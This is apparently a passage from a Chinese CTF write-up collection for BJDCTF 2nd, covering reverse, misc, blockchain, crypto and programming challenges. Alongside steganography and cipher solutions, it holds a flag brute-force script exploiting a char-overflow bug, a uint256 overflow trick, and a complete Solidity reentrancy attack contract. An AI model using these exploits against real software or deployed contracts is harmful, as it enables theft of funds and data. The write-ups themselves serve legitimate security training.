 0x804a000  0x804b000 rwxp     1000 2000   /xxx/diff
0xf7ffa000 0xf7ffd000 r--p     3000 0      [vvar]
0xf7ffd000 0xf7ffe000 r-xp     1000 0      [vdso]
0xfffdc000 0xffffe000 rwxp    22000 0      [stack]
```

> 打开的第一个文件数据读入buf1中，打开的第二个文件数据读入addr

因此，在第一个文件中存shellcode，在第二个文件中存payload，将返回地址覆盖为buf1地址，即可getshell。

# Reverse


## guessgame - Y1ng

签到题，拖进 IDA/OD 即可得到 flag (用 winhex/hexfiend/记事本打开也能得到 flag)

BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}



## 8086 ASM - DreamerJack
详细题解地址： [https://renjikai.com/bjdctf-2-dreamerjack/](https://renjikai.com/bjdctf-2-dreamerjack/)

数据段中存放的是一个 MSDOS 格式的以$结尾的经过异或加密的字符串。汇编代码就是把这玩意异或解密了一下然后调用 syscall 输出。其中有一个 jmp 的死循环就是用来干扰人的。如果想要不劳而获放到 DOS 里直接跑会死循环。



## 二进制一家亲(diff2) - TaQini 

考察点：字符上溢出、跑脚本爆破

题目来源：巨佬keer的diff非预期解+我两年前的汇编实验
代码链接：[https://github.com/TaQini/AssemblyLanguage/tree/master/lab/7](https://github.com/TaQini/AssemblyLanguage/tree/master/lab/7)
二进制，一家亲。

diff的预期解是缓冲区溢出，硬是让keer师傅找到了一处字符溢出...直接把flag给爆破出来了...tql....于是，我把diff的缓冲区溢出的洞补上，将之魔改成为re题目一道。
既然是re，就要想怎样解出flag。diff程序可以读flag和另一个文件，就叫做ktql好啦，并且会对这两个文件进行比较，所以思路就是变化ktql、爆破flag。

比较字符函数如下：

```
int compare()
{
  char v0; // al
  unsigned int i; // [esp+0h] [ebp-8h]
  int v3; // [esp+4h] [ebp-4h]

  v3 = 0;
  for ( i = 0; buf2[i] + buf1[i] && i < 0x400; ++i )
  {
    v0 = buf1[i];
    if ( v0 != buf2[i] )
      return v3 + 1;
    if ( v0 == 10 )
      ++v3;
  }
  return 0;
}
```

乍一看没毛病，其实不然。for的循环条件：

```
buf2[i] + buf1[i] && i < 0x400;
```

一般师傅：char + char = char 没毛病

keer师傅：char + char = 溢出！怼他！

我们知道char型变量占1个字节，相当于unsigned byte，表示范围是0x0-0xff，那么两char相加的范围就是0x0 - 0x1fe ，可是char型只能存储1个字节的数据，因此两char相加产生的进位就会被忽略。举个栗子，0x7d+0x83=0x100->0x0。get到了这一点，再看for循环条件，就能看出些端倪了。

buf2[i] + buf1[i] = 0x100 时会终止for循环，并且返回0。按程序正常的流程走，除非buf1和buf2完全相同，否则不可能返回0，而现在只要buf1和buf2任意位置对应的字节相加等于0x100，compare也会返回0。

返回 0 时程序打印 "一样"
返回值非0时 程序打印 行号
根据不同的返回值，就可以对flag进行逐个字节的爆破了，脚本如下：

```
#!/usr/bin/python
#__author__:TaQini

from subprocess import *
fix = ''
while 1:
    for i in range(0x100):
        payload = fix+chr(i)
        f = open('/tmp/ktql','w+')
        tmp = f.write(payload)
        f.close()
        p = Popen(['/home/ctf/diff','/tmp/ktql','/home/ctf/flag'],stdout=PIPE)
        res = p.stdout.read()
        if res != '1':
            # print res,chr(0x100-i)
            print fix
            fix+=chr(0x100-i)
            break
```

# Misc

## TARGZ - Y1ng

出题笔记： [https://www.gem-love.com/ctf/2056.html](https://www.gem-love.com/ctf/2056.html)

zip 压缩包，300 次压缩，文件后缀被修改成了 tar.gz，解压密码就是文件名

先用 file 命令得知是 zip 压缩包，winhex 看下发现不是伪加密，hint 又说密码不是破解出来的，所以剩下没什么其他可能性了，反正不试肯定只能混合等死了，试一下就能发现发现用题目名做密码就解压成功了。

解压好几次，解不动了，写个脚本跑一下：

```
#www.gem-love.com
#decompress.py
import os
import filetype
import time

while 1:
	aa = os.popen('ls')
	filename = aa.read().replace('decompress.py','').replace('\n', '')
	a = filename.replace('.tar.gz', '')
	kind = filetype.guess(filename)
	if kind.extension is 'zip':
		os.system("mv {} {}.zip|unzip -P {} {}.zip".format(filename, a, a, a))
		os.system("rm *.zip")
		time.sleep(0.1)
	else:
		print('解压完成')
		break
```

300 次解压后得到 flag：BJD{wow_you_can_rea11y_dance}

## 最简单的 misc - Y1ng

1. 伪加密，直接修复一下：java -jar ZipCenOp.jar r secret.zip 

2. 图片拖进 winhex 发现是 PNG，但是文件头丢失了一点东西，文件头填上：89 50 4E 47

![图](https://uploader.shimo.im/f/AB8dj6JI2QoCJQJF.jpg!thumbnail)

3. hex 转 String 得到 flag

BJD{y1ngzuishuai}

## 小姐姐 - Y1ng

可以发现图片中间有明显错位，考虑中间插入了什么东西，直接搜索 BJD 得到 flag（本来以为这题是 misc 里最简单的 solve 应该最多，结果不是，不知道为啥）

![图](https://uploader.shimo.im/f/Ystwd4jA6o8RMFXc.jpg!thumbnail)

BJD{haokanma_xjj}

## 圣火昭昭 - Y1ng

由题目描述：“flag 全靠猜”，”猜“还被特意加粗，得知是 outguess 隐写

在 Windows 上查看图片的属性，在备注上可以发现新佛曰

新佛曰的解密网站： [http://hi.pcmoe.net/buddha.html](http://hi.pcmoe.net/buddha.html)

解得 gemlove(实际上解出来 gemlovecom 上提时候忘了改了 后来题目告知去掉后三位 com )

```
outguess -k gemlove -r a.jpg -t flag.txt
```

即可得到 flag

BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}

## Imagin - 开场曲 - TaQini

听力题 [http://taqini.space/mikutap/](http://taqini.space/mikutap/)

根据键位-音节对应关系解出答案。

flag: BJD{MIKUTAP3313313}

## A Beautiful Picture - DreamerJack

详细题解地址： [https://renjikai.com/bjdctf-2-dreamerjack/](https://renjikai.com/bjdctf-2-dreamerjack/)

png 隐写。把图片的高度改为 1000 即可。

## Easybaba - 观花

![花花](https://uploader.shimo.im/f/Z28HHWzIYg8eHWGP.png!thumbnail)

1、这么大个图片发来看看，发现是个图种，里面还包含了 avi 文件，还曾经被 pr 编辑过。

2、对图种进行操作分离出压缩包解压出文件。

![花花](https://uploader.shimo.im/f/XzfLao0D554UYC85.png!thumbnail)

3、通过之前在 winhex/010editor 的观察，当前文件尾缀貌似不对，改为 avi。

4、打开视频发现全程都在叫爸爸，有几张图片一闪而过。用 pr 逐帧分离出有二维码的几张图片。通过工具或 Ps 进行二维码修复、扫码。

![花](https://uploader.shimo.im/f/0j6W6PsN9XMj2e8t.jpeg!thumbnail)

6、解出 base16 字符串并解码得到疑似栅栏的字符串。

![花](https://uploader.shimo.im/f/CIZsnUJkRbMQgYJ5.png!thumbnail)

7、（其实这道题是有描述的不知道为什么 buu 通道没了）可以社工出这是个伪栅栏，调整一下顺序好啦

![花](https://uploader.shimo.im/f/H6j1e9393GoivVSZ.png!thumbnail)

## Real_Easybaba - TaQini

考察点：二进制视野、视力

> 本题为脑洞题，拿花花的图片魔改了一下，不过自带 hint，目测不难

保存下图片，binwalk 查看，可以看到文件末尾有个 zip

```
% binwalk ezbb_r.png

DECIMAL HEXADECIMAL  DESCRIPTION
-----------------------------------------------------------
...       ...           ...
28673    0x7001        End of Zip archive, footer length: 22
```

用 winhex 之类的软件查看一下(我用的radare2)：


![图](https://uploader.shimo.im/f/5QszffWLL0AFd9Wr.png!thumbnail)

0x6e80这里有zip的文件头，照着正常的zip修复一下，可以解得hint文件:

```
                                                                 
                                                                  
    ##############    ##      ##    ##########  ##############    
    ##          ##  ####  ####  ######  ##      ##          ##    
    ##  ######  ##    ######      ##    ##      ##  ######  ##    
    ##  ######  ##  ####  ##  ##      ##        ##  ######  ##    
    ##  ######  ##      ##  ##      ##  ####    ##  ######  ##    
    ##          ##  ##  ##        ####          ##          ##    
    ##############  ##  ##  ##  ##  ##  ##  ##  ##############    
                            ##    ##        ##                    
    ##########  ##########  ####  ##  ##  ######  ##  ##  ##      
    ##    ####    ##  ##      ##    ##  ######  ##############    
    ####      ######  ##  ####  ####    ##    ##    ####  ##      
    ######  ####    ########    ######        ##########  ##      
    ####  ########    ##  ##  ##  ######              ######      
    ####      ##  ########  ##  ##  ##  ####  ##########  ####    
        ##########  ##        ##  ##        ####  ##    ####      
    ##########    ####  ##  ##    ##    ######    ##  ##  ##      
    ######    ####          ####  ##  ####            ####        
    ########        ##        ####      ######  ##  ####  ####    
    ##  ##  ########      ####    ##    ##                        
    ##    ##      ##      ##      ####  ######  ####  ##    ##    
    ##  ####    ####      ##        ######################  ##    
                    ####    ####    ######  ##      ##  ######    
    ##############  ######    ######      ####  ##  ##            
    ##          ##    ####  ####  ##      ####      ##            
    ##  ######  ##  ####    ##  ####  ####  ##################    
    ##  ######  ##  ##                        ##          ####    
    ##  ######  ##  ##########    ##          ####  ####  ##      
    ##          ##  ########    ##  ##    ####  ##  ##    ##      
    ##############  ########      ##########  ####  ##  ##        
                                                                  
```

ASCII qrcode，扫码 解得：

```
od -vtx1 ./draw.png | head -56 | tail -28
```

执行这个命令，得到：

```
% od -vtx1 ./ezbb_r.png | head -56 | tail -28
0000700 01 00 02 10 03 10 00 00 01 ee c0 b8 a6 00 00 00
0000720 ff ff ff 00 ff ff ff ff 00 ff ff 00 00 00 ff ff
0000740 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00
0000760 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00
0001000 ff ff 00 00 00 00 ff 00 00 ff 00 ff 00 ff 00 00
0001020 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00
0001040 ff 00 ff 00 ff 00 ff 00 00 ff 00 ff 00 00 ff 00
0001060 ff ff ff 00 ff ff ff 00 00 ff ff 00 00 00 ff ff
0001100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0001120 ff ff ff 00 ff ff ff 00 ff ff ff 00 ff ff 00 00
0001140 ff 00 00 00 00 00 ff 00 00 00 ff 00 00 ff 00 00
0001160 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 ff 00 00
0001200 00 00 ff 00 00 00 ff 00 ff 00 00 00 00 ff 00 00
0001220 ff ff ff 00 00 00 ff 00 ff ff ff 00 ff ff ff 00
0001240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0001260 ff ff ff 00 ff 00 ff 00 ff ff ff 00 ff ff ff 00
0001300 ff 00 00 00 ff 00 ff 00 ff 00 ff 00 00 00 ff 00
0001320 ff ff ff 00 ff ff ff 00 ff ff ff 00 00 00 ff 00
0001340 00 00 ff 00 00 00 ff 00 00 00 ff 00 00 00 ff 00
0001360 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 00 ff 00
0001400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0001420 ff ff ff 00 ff ff 00 00 00 00 00 00 00 00 00 00
0001440 ff 00 00 00 00 ff 00 00 00 00 00 00 00 00 00 00
0001460 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00
0001500 ff 00 ff 00 00 ff ff 00 00 00 00 00 00 00 00 00
0001520 ff 00 ff 00 00 ff 00 00 00 00 00 00 00 00 00 00
0001540 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00
0001560 00 00 00 00 ff ff 00 63 da e9 3c 36 b1 aa 93 59
```

不难看出，大部分区域只有00 和 ff 两种字节。

> 此刻的你，做题做的眼花了。你把眼睛摘掉，揉了揉眼睛，突然看出了flag。

开个玩笑... 把00字节去掉，即可看出flag:

```

0000720 ff ff ff    ff ff ff ff    ff ff          ff ff
0000740 ff    ff          ff       ff    ff       ff   
0000760 ff    ff          ff       ff    ff       ff   
0001000 ff ff             ff       ff    ff    ff      
0001020 ff    ff          ff       ff    ff       ff   
0001040 ff    ff    ff    ff       ff    ff       ff   
0001060 ff ff ff    ff ff ff       ff ff          ff ff
0001100                                                
0001120 ff ff ff    ff ff ff    ff ff ff    ff ff      
0001140 ff                ff          ff       ff      
0001160 ff ff ff          ff    ff ff ff       ff      
0001200       ff          ff    ff             ff      
0001220 ff ff ff          ff    ff ff ff    ff ff ff   
0001240                                                
0001260 ff ff ff    ff    ff    ff ff ff    ff ff ff   
0001300 ff          ff    ff    ff    ff          ff   
0001320 ff ff ff    ff ff ff    ff ff ff          ff   
0001340       ff          ff          ff          ff   
0001360 ff ff ff          ff    ff ff ff          ff   
0001400                                                
0001420 ff ff ff    ff ff                              
0001440 ff             ff                              
0001460 ff ff ff       ff                              
0001500 ff    ff       ff ff                           
0001520 ff    ff       ff                              
0001540 ff ff ff       ff                              
0001560             ff ff    63 da e9 3c 36 b1 aa 93 59
```

> flag: BJD{572154976} (感兴趣的小姐姐可以qq搜一下这个号码)

# BlockChain

## 坚固性？！ - imagin

**tags：**

* 智能合约的部署等基本操作
* Solidity uint 上溢出

下载附件，给了题目源码以及地址，审计源码：


首先有个 getFlag() 函数：

```
function getFlag() public view returns (string){
    require(balances[msg.sender] > 9999999);
    return flag;
}
```

很明显需要通过攻击合约让自己的 `balance` 变大，继续审计其他函数，发现只有 Transfer() 有对 balance 的操作：

```
function Transfer(address[] _addr, uint256 _value) public returns (bool){
    uint times = _addr.length;
    uint256 amount = uint256(times) * _value;
    require(_value > 0 && balances[msg.sender] >= amount);
    require(times > 0 && times < 10);
    balances[msg.sender] -= amount;
    for(uint i = 0; i < times; i++){
        balances[_addr[i]] += _value;
    }
    return true;
}
```

Transfer() 函数支持给不多于 10 个账户打钱，打钱的总数 `amount` 是由收钱账户的个数乘以参数 `_value` 算出，最后打钱账户扣除 `amount` 单位的余额。这个过程中的操作都是用符号操作而没有用 safeMath，再加上合约没有判断 `amount` 是否会溢出，因此可以构造条件使得 `uint256` 类型的 `amount` 超出表达范围而溢出。



`uint256` 类型能表示的范围是 0 ~ ((2 **  256) - 1) ，因此我们可以让 `amount` 大于 `((2 ** 256) - 1)`。



以我的 `Ropsten` 地址 `0x00E7aC6a5614Bcc4e131872B8Ae055D9ccFE4110` 举例，我们一开始可以通过调用 `getBalance()` 函数白嫖到 100 `balance`，再调用转账函数 `Transfer()`，参数分别为 `["0x00E7aC6a5614Bcc4e131872B8Ae055D9ccFE4110","0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c"]` 和 `57896044618658097711785492504343953926634992332820282019728792003956564819968`，其中第一个参数的第二个地址随意填写，只要满足地址格式即可，第二个参数的值为 `2 ** 255`，这样合约接收到交易后，计算的 `amount` 为 `2 * (2 ** 255) = 2 ** 256` 大于能表示的最大值，因此此时的 `amount` 的值溢出为 `0`，合约可以顺利执行扣费（扣除 0），并给两个地址的 balance 加上 `2 ** 255`，执行 getFlag() 即可。

![图](https://uploader.shimo.im/f/HrerSESboFAa6QoX.png!thumbnail)

得到的 flag 是 16 进制，转成 ascii 码即可提交。

![图](https://uploader.shimo.im/f/Og0Ffqeiuwkdh8HS.png!thumbnail)

## 提供暴打出题人服务！ - imagin

**tags:** 

* 重入攻击
* 下溢出

这题对比上一题就略显复杂，附件中还是给了源码和地址，先审计 `getFlag()`：

```
function getFlag() public view returns (string){
    if(users[msg.sender][5] >= 1){
        return flag;
    }
    else{
        return "%e7%88%ac%ef%bc%81";
    }
}
```

拿到 flag 的条件是拥有 `users[msg.sender] [5]`，再回头去找 `users ` 的定义：

```
mapping (address => mapping(uint8 => uint8))users;
```

此外，还有个全局变量 `goods` 的定义：

```
struct good{
    string name;
    uint256 value;
}
mapping (uint8 => good) goods;
```

注意变量的类型（uint8 和 uint256）结合上合约名小卖部，可以推测 `goods` 是用来存储商品的，而 `users` 可能是存储每个用户持有的商品数量。其中 `goods` 中的内容可以通过 `showGoods()` 函数查看，具体的对应关系如下：

```
goods[0].name = "喂龙辣条";
goods[0].value = 1;
goods[1].name = "Taqini 的猫猫表情包";
goods[1].value = 0x99;
goods[2].name = "imagin 小黑屋的钥匙";
goods[2].value = 0x9999;
goods[3].name = "Taqini 独家 auto_pwn.py";
goods[3].value = 0x999999;
goods[4].name = "BJD{chui_bao_Taqin!}";
// fake!
goods[4].value = 0x99999999;
goods[5].name = "锤爆 Taqini！";
goods[5].value = 0x9999999999;
```

接着找操作 `users` 的函数 `giveBack()`、`giveAllBack()` 以及 `buy()`，其中`giveAllBack()`算是升级版的`giveBack()` 

```
function buy(uint8 index) public returns (bool){
    require(index <= 5 && index >= 0);
    uint256 cost = goods[index].value;
    require(cost > 0);
    require(getCredit(msg.sender) >= cost);
    require(getCredit(msg.sender) - cost >= 0);
    credit[msg.sender] -= cost;
    users[msg.sender][index] += 1;
    return true;
}

function giveBack(uint8 index) public returns (bool){
    require (index <= 5);
    require (users[msg.sender][index] > 0);
    uint256 price = goods[index].value;
    require (address(this).balance > price);
    if(price > 10000 wei){
        price = 1 wei;
        // 中间商 Taqini 赚差价~
    }
    msg.sender.call.value(1)();
    users[msg.sender][index] --;
    transfer(this, msg.sender, price);
}
```

buy()` 函数可以让我们购买某一项商品，而 `giveBack()` 是把商品退回并返回余额。值得注意的是 `giveBack()`  是先给用户退钱，再让用户的商品存储变化，这就提供了重入攻击的机会。用合约去操作`giveBack()` 函数，当执行到 `msg.sender.call.value(1)();` 并开始打钱时会调用合约的 `fallback()` 函数，在 `fallback()` 函数中我们可以再次调用 `giveBack()`。由于一开始我们只有一个单位的商品库存，正常调用`giveBack()` 函数会使库存 --，变为 0，再次调用再次 --，会造成下溢出，变为 `uint8` 的最大值 255，将货物卖出即可。

部署攻击合约：

```
pragma solidity ^0.4.23;
// Author : imagin
// Blog : https://imagin.vip/
// Filename : exp.sol

import "Taqini.sol";
contract exp{
    XiaoMaiBu x;
    uint8 num;
    uint8 times;
    constructor (address addr){
        x = XiaoMaiBu(addr);
    }
    
    function getFlag() public payable returns (string){
        x.deposit.value(1)();
        for(uint8 i = 0; i < 5; i++){
            num = i;
            attack();
            attack();
        }
        x.buy(5);
        return x.getFlag();
    }
    
    function flag() public view returns (string){
        return x.getFlag();
    }
    
    function attack() public payable{
        times = 1;
        x.buy(num);
        x.giveBack(num);
        x.giveAllBack(num);
    }
    
    function getMyCredit() public view returns (uint256){
        return x.getCredit(this);
    }
    
    function getMyGood(uint8 index) public view returns (uint8){
        return x.getMyGood(index);
    }
    
    function() public payable{
        if(times > 0){
            times --;
            x.giveBack(num);
        }
        
    }
}
```

将攻击合约部署到题目的合约地址上，执行 `getFlag()` 函数并支付 1 wei 即可获得 flag。

![图](https://uploader.shimo.im/f/f6rhop5UufAaL4qg.png!thumbnail)

![图](https://uploader.shimo.im/f/ZFoyNoBdNm0ZL8Dk.png!thumbnail)

最后，由于本懒狗没加发邮件的操作，把 flag 放到链上了，导致有的大佬直接查到交了，我已经暴打完我自己了，向各位师傅谢罪。

![图](https://uploader.shimo.im/f/grLcBtvqJwIVPq6k.png!thumbnail)

# Crypto

## 老文盲了 - imagin

**tags：**

生僻汉字读音

全部是生僻汉字，可以直接复制到这个[网站](http://www.duchulai.com/) ，让他读出来。


flag：BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵} 

## 灵能精通 - Y1ng

题目描述：身经百战的 Y1ng 已经达到崇高的武术境界，以自律克己来取代狂热者的战斗狂怒与传统的战斗形式。Y1ng 所受的训练也进一步将他们的灵能强化到足以瓦解周遭的物质世界。借由集中这股力量，Y1ng 能释放灵能能量风暴来摧毁敌人的心智、肉体与器械。



查一下这段话发现是 SC2 中高阶圣堂武士的技能描述，这个技能正好就是灵能精通

所以，这个密码是圣堂武士密码（如果本来就知道这个是圣堂武士密码就当我上面没说

![圣堂](https://uploader.shimo.im/f/FI4gMLKLcjYi3bXD.jpg!thumbnail)

BJD{IMKNIGHTSTEMPLAR}

## 签到 - Y1ng

base64 解码

BJD{W3lc0me_T0_BJDCTF}

## 燕言燕语 - Y1ng

先 hex 转 String 得到：yanzi ZJQ{xilzv_iqssuhoc_suzjg} 

看得出来是维吉尼亚密码，yanzi 是 key，解密一下得到 flag

BJD{yanzi_jiushige_shabi}

## Y1nglish - Y1ng

cryptogram，题目告诉是英语改过来的，基本可以知道这最后一行就是 flag 的密文：

```
MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}
```

这个字符替换是无序的，瞪眼法肯定解不出来。但是毕竟这是 0 基础萌新赛，难是不可能难的，直接找个在线的 cryptogram solver 即可解密，比如我用的 quipqiup

![图](https://uploader.shimo.im/f/RIFVABl1uRsnuqt8.jpg!thumbnail)

```
Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}
```

但是最后一单词是错误的，hint 也告知有个地方需要自己修正。

可以看上面那段话也可以发现 worying at a bany，应该是 working at a bank，还有 networy，很明显应该是 network，y 要改成 k；直接读也发现 cracy 这个单词不对劲，应该和暴力破解是同类型的词，所以改成 Cr4ck

这里不知道为啥很多人找不到哪里需要改

1.cracy 这单词很明显翻译不通顺 

2.networy security 应该人人都知道是 network security 吧 

3.hint 告诉了不是改成 crazy

本来打算让自己找问题自己修复的，结果太多人私信问了就放了 hint，结果放了 hint 后又收到了 20 份私信，这里有那么难吗

BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}

## cat flag - TaQini

喵转二进制，二进制转字符

## EasyRSA(rsa0) - TaQini

初中数学

```
#!/usr/bin/python

import gmpy2
from Crypto.Util import number

e=12820879
paq=22035538670889005763411346398188449828911284840345328160261913313226922243903640186051004333184175934985590738487970782950850769889017301738579320767563604
psq=-2616687740098848296531856681549028773761500895466635575611042725318249385942319978624580589818611632411208541237433234957285775684615140541031424858927618
c=63429897001235842596733118756386881780164898782046881450552816549401778891793459480050856041691198931891631850185841945327259580257701334694328660248355158394695998869152900121288763261566072460165128360649173228270012193359059601535865008029486495136118069938486695657407934083528644355174908663965015161231

p = (paq+psq)/2
q = (paq-psq)/2

# print p
# print q

d = gmpy2.invert(e, (p-1)*(q-1))
# print d

m = pow(c, d, p*q)

print( number.long_to_bytes(m) )
```

## BabyRSA(rsa1) - TaQini

初中数学2

已知p^2+q^2和p-q，联立方程组可解出p,q

此外本题每访问一次都会给一组随机的e和c，但是p^2+q^2和p-q不变，因此可以考虑共模攻击

```
#!/usr/bin/python

from gmpy2 import invert

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

c1 = 13059791912290365884110457098731665586853663227859975324515452483248905712995283805657895279103503078568984817560562327990551296032014337307204702778294678463169670457941035460849924417314753714582332912610743410503116636862265402037224321440198903389671800616624073975596493722449281409536490964633918247152
e1 = 15492881

c2 = 12538641982922201980998233655522552860417752256884018604119802482922607625017051430692995951603938523604896976835379622478935236345224594163403128407121088386944976580418447285730657292885859668906194539671729079742749489618586637025994402233749014218891190841419156399172795547808592832028572876480664570767
e2 = 14181799

A = 141705753777904930180186345152697719960529271724365505667588476081668022124314860399036949077434585591169427333761343028657656047447722131571881186462988570427862629528991007547683269938572556466491551151797214333916297821603322882083405345912527685342207853111914232514891591341485863652948034805165736236490
B = -156153155641599491125048710150137099645478510338200983903514608918666436450311285805383608815127180821966064543429131837653238097144992849084996291260802

n = (A-B**2)/2
# print n

s = egcd(e1, e2)
s1 = s[1]
s2 = s[2]
if s1<0:
    s1 = - s1
    c1 = invert(c1, n)
elif s2<0:
    s2 = - s2
    c2 = invert(c2, n)

m = pow(c1,s1,n)*pow(c2,s2,n) % n

print hex(m)[2:].decode('hex')
```

# Programming

## Strenuous_Huffman - DreamerJack

详细题解地址： [https://renjikai.com/bjdctf-2-dreamerjack/](https://renjikai.com/bjdctf-2-dreamerjack/)

简要的解题思路如下：编写一个 BitMap 类，要支持从文件加载内容到内部数组和将内部数组存储到文件中，还要支持按位对数组的访问。然后按照压缩编码和原始编码的对应关系，逐个的将压缩后的比特信息翻译为原始信息并保存。